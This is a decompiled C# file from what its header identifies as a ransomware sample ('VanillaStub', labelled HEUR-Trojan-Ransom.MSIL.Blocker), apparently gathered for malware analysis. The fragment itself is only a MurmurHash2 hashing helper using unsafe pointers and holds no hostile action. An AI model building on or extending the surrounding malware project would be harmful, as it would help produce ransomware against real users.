// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.src.MurmurHash2Unsafe
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

namespace VanillaStub.Helpers.Services.StreamLibrary.src
{
  public class MurmurHash2Unsafe
  {
    private const uint m = 1540483477;
    private const int r = 24;

    public unsafe uint Hash(byte* data, int length)
    {
      if (length == 0)
        return 0;
      uint num1 = (uint) (-980477317 ^ length);
      int num2 = length & 3;
      int num3 = length >> 2;
      uint* numPtr = (uint*) data;
      while (num3 != 0)
      {
        uint num4 = *numPtr * 1540483477U;
        uint num5 = (num4 ^ num4 >> 24) * 1540483477U;
        num1 = num1 * 1540483477U ^ num5;
        --num3;
        ++numPtr;
      }
      switch (num2)
      {
        case 1:
          num1 = (num1 ^ (uint) *(byte*) numPtr) * 1540483477U;
          break;
        case 2:
          num1 = (num1 ^ (uint) (ushort) *numPtr) * 1540483477U;
          break;
        case 3:
          num1 = (num1 ^ (uint) (ushort) *numPtr ^ (uint) ((byte*) numPtr)[2] << 16) * 1540483477U;
          break;
      }
      uint num6 = (num1 ^ num1 >> 13) * 1540483477U;
      return num6 ^ num6 >> 15;
    }
  }
}
